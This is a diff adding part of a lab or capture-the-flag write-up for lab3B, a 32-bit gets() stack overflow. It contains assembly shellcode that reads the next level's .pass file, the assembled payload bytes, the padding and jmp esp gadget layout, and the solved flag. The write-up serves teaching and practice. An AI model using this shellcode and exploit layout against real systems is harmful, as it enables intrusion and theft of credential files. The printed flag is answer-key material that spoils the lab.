@@ -146,3 +146,68 @@ There is no `jmp esp` in the binary itself, so the gadget comes from a loaded li
 Any result in an executable `libc` mapping serves, with one constraint. Its four little-endian bytes must carry no `0x0a`, since that byte would end the `gets` read early. On this libc base the high two bytes are always `b7` and `0xe2..0xf9`, so only the low two bytes can offend, and `0xb7e22a85` (`85 2a e2 b7`) is clean. That is the gadget used below. It will not appear in a `disassemble main`, because it lives in libc rather than the binary, and it may not appear in a plain disassembly of its own libc function either, since `ff e4` can be bytes inside a larger intended instruction that only decode as `jmp esp` when execution starts exactly on them.
 
 ## Writing the shellcode
+
+The stub runs four syscalls and carries the target path inline. It is position independent. A `call` over the trailing string pushes that string's address, and the stub pops it as the `open` argument, so no absolute address is baked in.
+
+```asm
+    jmp short get_path
+do_it:
+    pop    esi                  ; esi = &"/home/lab3A/.pass"
+    sub    esp, 0x100           ; scratch buffer below the shellcode
+ 
+    xor    eax, eax
+    mov    al, 5                ; __NR_open
+    mov    ebx, esi             ; path
+    xor    ecx, ecx             ; O_RDONLY
+    xor    edx, edx             ; mode 0
+    int    0x80                 ; fd in eax
+ 
+    mov    ebx, eax             ; fd
+    xor    eax, eax
+    mov    al, 3                ; __NR_read
+    mov    ecx, esp             ; scratch
+    xor    edx, edx
+    mov    dh, 1                ; count = 0x100
+    int    0x80                 ; n in eax
+ 
+    mov    edx, eax             ; n
+    xor    eax, eax
+    mov    al, 4                ; __NR_write
+    xor    ebx, ebx
+    inc    ebx                  ; fd = 1 (stdout)
+    int    0x80                 ; ecx still points at scratch
+ 
+    xor    eax, eax
+    mov    al, 1                ; __NR_exit
+    xor    ebx, ebx
+    int    0x80
+get_path:
+    call   do_it
+    db "/home/lab3A/.pass", 0x00
+```
+
+Two constraints shaped the encoding. `gets` ends the read at `0x0a` and nowhere else, so the bytes may contain NUL freely and must contain no `0x0a`. The assembled 77 bytes meet that, since the `sub esp,0x100` immediate carries NUL bytes, which are allowed, and no byte is `0x0a`. The scratch buffer sits below the shellcode rather than above it, so the `read` does not overwrite the instructions still executing.
+ 
+Assembled:
+ 
+```
+\xeb\x34\x5e\x81\xec\x00\x01\x00\x00\x31\xc0\xb0\x05\x89\xf3\x31
+\xc9\x31\xd2\xcd\x80\x89\xc3\x31\xc0\xb0\x03\x89\xe1\x31\xd2\xb6
+\x01\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\x43\xcd\x80\x31\xc0
+\xb0\x01\x31\xdb\xcd\x80\xe8\xc7\xff\xff\xff\x2f\x68\x6f\x6d\x65
+\x2f\x6c\x61\x62\x33\x41\x2f\x2e\x70\x61\x73\x73\x00
+```
+
+ ## Exploitation
+
+ The payload is padding to the measured offset, the `jmp esp` gadget on the saved return address, then the shellcode:
+ 
+```
+[ "A" * 156 ][ jmp esp = 0xb7e22a85 ][ open/read/write/exit stub + path ][ 0x0a ]
+```
+
+When the child's `main` returns, control lands on the gadget, the gadget jumps into `esp`, and `esp` points at the shellcode. The stub reads the flag file and writes it to stdout, then exits cleanly, so the parent's `wait` returns normally and no forbidden syscall is attempted. The trailing `0x0a` is the newline that terminates `gets`, and it is the only `0x0a` anywhere in the input.
+
+![](./img/solution_3B.png)
+
+FLAG: `wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd`
